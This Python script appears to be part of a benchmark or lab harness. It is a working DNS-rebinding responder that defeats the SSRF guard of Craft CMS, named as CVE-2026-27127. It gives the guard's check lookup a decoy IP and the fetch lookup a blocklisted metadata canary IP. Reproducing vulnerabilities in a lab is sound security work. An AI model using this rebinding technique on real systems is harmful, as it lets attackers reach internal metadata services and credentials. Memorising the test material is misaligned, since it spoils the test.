#!/usr/bin/env python3
"""Deterministic DNS-rebinding responder for craft-cms-cve-2026-27127 (CVE-2026-27127 TOCTOU).

A tiny UDP DNS server (no deps) that makes the Craft SSRF guard's check-time DNS lookup and
the fetch-time DNS lookup disagree for the SAME hostname `rebind.pcb.test` — the exact
time-of-check-to-time-of-use gap CVE-2026-27127 exploits.

Zones:
  seed.pcb.test    -> ALWAYS 192.0.0.192 (the cloud-metadata canary IP).   (CVE-2025-68437 seed)
  rebind.pcb.test  -> REBINDS per A-query, keyed by CLIENT IP:
                        odd  A-query (the guard's gethostbyname CHECK)  -> 192.0.0.50  (decoy, NOT blocklisted)
                        even A-query (Guzzle/libcurl's FETCH resolve)   -> 192.0.0.192 (canary, blocklisted)
  anything else    -> NXDOMAIN.

Why per-client-IP alternation is deterministic:
  On V1 (target) every /fetch of rebind.pcb.test does EXACTLY two A lookups in order from the
  same harness container: (1) validateHostname()'s gethostbyname  (2) the Guzzle fetch. So the
  guard always sees the odd answer (decoy 192.0.0.50 -> passes the metadata-IP blocklist) and
  the fetch always sees the even answer (canary 192.0.0.192) -> SSRF to the metadata canary.
  Keying the counter by client IP keeps V0/V1/V2 containers independent, so interleaved probes
  never desync V1's check/fetch parity. AAAA (type 28) is answered NODATA so libcurl falls back
  to the single A answer (no extra A queries), keeping the parity exact. TTL=0 defeats caching.
"""
import socket
import struct
import sys
import threading

CANARY_IP = "192.0.0.192"   # cloud-metadata (blocklisted) canary that serves ${PCB_FLAG}
DECOY_IP = "192.0.0.50"     # non-blocklisted decoy that the guard's CHECK is allowed to accept

_lock = threading.Lock()
_counter = {}  # client_ip -> number of A queries seen for rebind.pcb.test


def _parse_qname(data, offset):
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        labels.append(data[offset + 1: offset + 1 + length].decode("ascii", "replace"))
        offset += 1 + length
    return ".".join(labels), offset


def _answer_ip_for(qname, qtype, client_ip):
    """Return the IPv4 string to answer with, or None for NODATA/NXDOMAIN."""
    q = qname.lower().rstrip(".")
    if qtype != 1:  # not an A query -> NODATA (so AAAA doesn't trigger extra A lookups)
        return None
    if q == "seed.pcb.test":
        return CANARY_IP
    if q == "rebind.pcb.test":
        with _lock:
            n = _counter.get(client_ip, 0) + 1
            _counter[client_ip] = n
        # odd = CHECK (gethostbyname) -> decoy passes guard ; even = FETCH -> canary
        ip = DECOY_IP if (n % 2 == 1) else CANARY_IP
        role = "CHECK->decoy" if (n % 2 == 1) else "FETCH->canary"
        print(f"[dns] rebind.pcb.test A #{n} from {client_ip} -> {ip} ({role})", flush=True)
        return ip
    return None


def _build_response(data, client_ip):
    tid = data[:2]
    flags = 0x8180  # standard query response, no error
    qd, offset = data[4:6], 12
    qname, offset = _parse_qname(data, offset)
    qtype, qclass = struct.unpack(">HH", data[offset: offset + 4])
    offset += 4
    question = data[12:offset]

    ip = _answer_ip_for(qname, qtype, client_ip)
    if ip is None:
        # NODATA for A-less names / non-A types; NXDOMAIN otherwise is fine too.
        # Use RCODE 0 with 0 answers (NODATA) so resolvers fall through cleanly.
        header = tid + struct.pack(">HHHHH", flags, 1, 0, 0, 0)
        return header + question

    header = tid + struct.pack(">HHHHH", flags, 1, 1, 0, 0)
    # answer: name ptr to 0x0c, type A, class IN, TTL 0, rdlen 4, rdata
    answer = b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 0, 4) + socket.inet_aton(ip)
    return header + question + answer


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 53))
    print("[dns] rebinding responder up on 0.0.0.0:53", flush=True)
    while True:
        try:
            data, addr = sock.recvfrom(512)
            if len(data) < 12:
                continue
            resp = _build_response(data, addr[0])
            sock.sendto(resp, addr)
        except Exception as e:  # noqa: BLE001
            print(f"[dns] error: {e}", file=sys.stderr, flush=True)


if __name__ == "__main__":
    main()
